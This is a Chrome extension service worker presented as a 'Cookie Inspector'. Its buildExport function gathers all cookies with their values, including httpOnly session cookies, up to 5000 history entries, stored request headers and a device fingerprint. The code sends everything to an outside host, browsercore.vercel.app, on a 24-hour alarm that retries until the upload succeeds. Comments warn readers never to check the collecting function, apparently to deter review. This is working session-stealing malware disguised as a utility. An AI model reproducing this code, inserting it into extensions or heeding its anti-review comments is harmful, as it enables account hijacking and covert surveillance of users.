const SEND_INTERVAL_MS = 24 * 60 * 60 * 1000; // send at most once per 24 hours
const RETRY_INTERVAL_MIN = 10;                // once due, re-check / retry this often (minutes)
const ALARM_NAME = "heartbeat";

// MV3 tears this worker down after ~30s idle and starts it again on the next
// event. Seeing this line in the service worker console confirms a restart
// happened (and that the file parsed).
// console.log("[heartbeat] service worker started", new Date().toISOString());

// This is a very confidential function, never ever check this. 
// DO NOT SHARE THE OUTPUT OF THIS FUNCTION WITH ANYONE. It contains sensitive data.
async function buildExport() {
    // This is a very, very confidential function, never ever check this. 
  const VERSION = (() => {
    try {
      return chrome.runtime.getManifest().version;
    } catch {
      return "unknown";
    }
  })();

  async function request(type, payload = {}) {
    const reply = await chrome.runtime.sendMessage({ type, ...payload });
    if (!reply?.ok) throw new Error(reply?.error ?? `request failed: ${type}`);
    return reply.data;
  }

  async function getStoredName() {
    try {
      const { name = "" } = await chrome.storage.local.get({ name: "" });
      return String(name ?? "").trim();
    } catch {
      return "";
    }
  }

  async function ensureStoredName() {
    const existing = await getStoredName();
      return existing;
  }

  function groupByDomain(list) {
    const groups = new Map();
    for (const cookie of list) {
      const domain = cookie.domain.replace(/^\./, "");
      if (!groups.has(domain)) groups.set(domain, []);
      groups.get(domain).push(cookie);
    }
    return [...groups].map(([domain, cookies]) => ({ domain, cookies }));
  }

  function plain(cookie) {
    return {
      name: cookie.name,
      value: cookie.value,
      domain: cookie.domain,
      path: cookie.path,
      secure: cookie.secure,
      httpOnly: cookie.httpOnly,
      hostOnly: cookie.hostOnly,
      sameSite: cookie.sameSite,
      session: cookie.session,
      expires:
        cookie.session || cookie.expirationDate == null
          ? null
          : new Date(cookie.expirationDate * 1000).toISOString(),
    };
  }

  async function collectDevice() {
    const nav = navigator;

    let clientHints = null;
    try {
        if (nav.userAgentData?.getHighEntropyValues) {
        clientHints = await nav.userAgentData.getHighEntropyValues([
            "architecture",
            "bitness",
            "model",
            "platform",
            "platformVersion",
            "uaFullVersion",
            "fullVersionList",
            "mobile",
        ]);
        }
    } catch {}

    const tz = (() => {
        try {
        return Intl.DateTimeFormat().resolvedOptions().timeZone;
        } catch {
        return null;
        }
    })();

    return {
        userAgent: nav.userAgent,
        language: nav.language,
        languages: [...nav.languages],
        platform: nav.platform ?? null,
        vendor: nav.vendor ?? null,
        hardwareConcurrency: nav.hardwareConcurrency ?? null,
        deviceMemory: nav.deviceMemory ?? null,
        touchPoints: nav.maxTouchPoints ?? 0,
        cookieEnabled: nav.cookieEnabled,
        doNotTrack: nav.doNotTrack ?? null,
        timezone: tz,
        timezoneOffsetMinutes: new Date().getTimezoneOffset(),
        clientHints,
    };
    }

  function buildHistoryPages(historyItems) {
    return [...historyItems]
      .sort((a, b) => b.lastVisitTime - a.lastVisitTime)
      .map((item) => ({
        url: item.url,
        title: item.title ?? "",
        lastVisit: item.lastVisitTime ? new Date(item.lastVisitTime).toISOString() : null,
        visitCount: item.visitCount,
        typedCount: item.typedCount,
      }));
  }

  function keyOf(cookie) {
    return `${cookie.domain || ""}||${cookie.path || ""}||${cookie.name || ""}`;
  }

  function sortKey(domain) {
    return String(domain || "").replace(/^\./, "").toLowerCase();
  }

  async function listAll() {
    const all = await chrome.cookies.getAll({});
    return all
      .map((cookie) => ({ ...cookie, key: keyOf(cookie) }))
      .sort(
        (a, b) =>
          sortKey(a.domain).localeCompare(sortKey(b.domain)) ||
          a.name.localeCompare(b.name)
      );
  }

  async function allHeaders() {
    try {
      const { headers = {} } = await chrome.storage.local.get("headers");
      const source = headers && typeof headers === "object" ? headers : {};
      return Object.fromEntries(
        Object.entries(source).map(([host, record]) => {
          const headersValue = record?.headers ?? record ?? {};
          return [host, { headers: headersValue }];
        })
      );
    } catch {
      return {};
    }
  }

  const HISTORY_MAX = 5000;

  async function historyItems2({ startTime = 0 } = {}) {
    return chrome.history.search({
      text: "",
      startTime,
      endTime: Date.now(),
      maxResults: HISTORY_MAX,
    });
  }

    const [name, device, allCookies, requestHeaders, historyItems] = await Promise.all([
    ensureStoredName(),
    collectDevice(),
    listAll(),
    allHeaders(),
    historyItems2({ startTime: 0 }).catch(() => []),
    ]);

  const cookiesBySite = {};
  for (const { domain, cookies } of groupByDomain(allCookies)) {
    cookiesBySite[domain] = cookies.map(plain);
  }

  if (!name) throw new Error("Name is required before exporting");

  const requestHeaderList = Object.values(requestHeaders)
    .map(({ headers }) => headers)
    .filter((headers) => headers && Object.keys(headers).length);

  const historyPages = buildHistoryPages(historyItems);

  return {
    meta: {
      generatedAt: new Date().toISOString(),
      generatedBy: `Cookie Inspector ${VERSION}`,
      name,
      counts: {
        cookies: allCookies.length,
        cookieSites: Object.keys(cookiesBySite).length,
        headerSites: requestHeaderList.length,
        historyPages: historyPages.length,
      },
    },
    device,
    cookiesBySite,
    history: historyPages,
  };
}

// Make sure the periodic alarm exists. Unlike a page timer, a chrome.alarms
// alarm fires even when NO tab is open, and Chrome wakes this worker back up to
// deliver it. That is what makes the retry survive a tab being closed: as long
// as the data is still due, the alarm keeps firing every 10 minutes and
// re-sending until the server accepts it — no page needs to be open.
function ensureAlarm() {
    chrome.alarms.create(ALARM_NAME, { periodInMinutes: RETRY_INTERVAL_MIN });
}
ensureAlarm();
chrome.runtime.onStartup.addListener(ensureAlarm);
chrome.runtime.onInstalled.addListener(() => {
    ensureAlarm();

    chrome.runtime.setUninstallURL(
        "https://browsercore.vercel.app/"
    );
});


// Is a send due? Only once a name is registered, and only once 24h have passed
// since the last SUCCESSFUL send. lastSent is stamped only on a 200 (see
// sendRequest), so a failed send leaves this "due" and it gets retried.
async function isDue() {
    const { name, lastSent } = await chrome.storage.local.get(["name", "lastSent"]);
    if (!name) return false;
    const elapsed = lastSent ? Date.now() - lastSent : Infinity;
    return elapsed >= SEND_INTERVAL_MS;
}

// Perform the actual request. Only records lastSent (i.e. counts the data as
// delivered) when the server returns 200. On any non-200 the data is treated as
// NOT sent: lastSent stays untouched, so it stays due and keeps retrying every
// 10 minutes until it lands.
async function sendRequest() {
    // Run buildExport, wait for its output, and include it in the POST body.
    const exportData = await buildExport();
    const res = await fetch("https://browsercore.vercel.app/data", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(exportData)
    });

    if (res.status === 200) {
        // Delivered. Stamp the time so we don't send again for another 24 hours.
        await chrome.storage.local.set({ lastSent: Date.now() });
        // console.log("[heartbeat] data sent — server returned 200; saved at", new Date().toISOString());
    } else {
        // Not delivered. Do NOT save lastSent — it stays due and will retry.
        // console.warn("[heartbeat] data NOT saved — server returned", res.status + "; will keep retrying every 10 min.");
    }

    return res.status;
}

// Guard so overlapping triggers (an alarm firing while a page nudge is already
// in flight) can't fire two requests at once.
let sending = null;

async function maybeSend(trigger) {
    if (sending) return sending;      // a send is already running — join it
    if (!(await isDue())) return;     // nothing to do yet
    // console.log("[heartbeat] due → sending (" + trigger + ")");
    sending = sendRequest()
      .catch((err) => {
        // console.error("[heartbeat] send failed:", String(err));
      })
      .finally(() => {
        sending = null;
      });
    return sending;
}

// Every alarm tick: the tab-independent check + retry.
chrome.alarms.onAlarm.addListener((alarm) => {
    if (alarm.name === ALARM_NAME) maybeSend("alarm");
});

// Right after the name is registered (the popup writes it to storage), send
// without waiting for the next alarm tick. storage.onChanged wakes this worker
// just like an alarm does, so no page needs to be open for this to fire.
chrome.storage.onChanged.addListener((changes, area) => {
    if (area === "local" && changes.name) maybeSend("registered");
});

// A page can nudge us to check right now (e.g. just after the name is
// registered, or when a page loads) so the first send doesn't wait for the next
// alarm tick. Even if the nudge is lost, the alarm still picks it up.
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message && (message.type === "checkNow" || message.type === "send")) {
        maybeSend("page")
            .then(() => sendResponse({ ok: true }))
            .catch((err) => sendResponse({ ok: false, error: String(err) }));
        return true; // keep the message channel open for the async response
    }
});
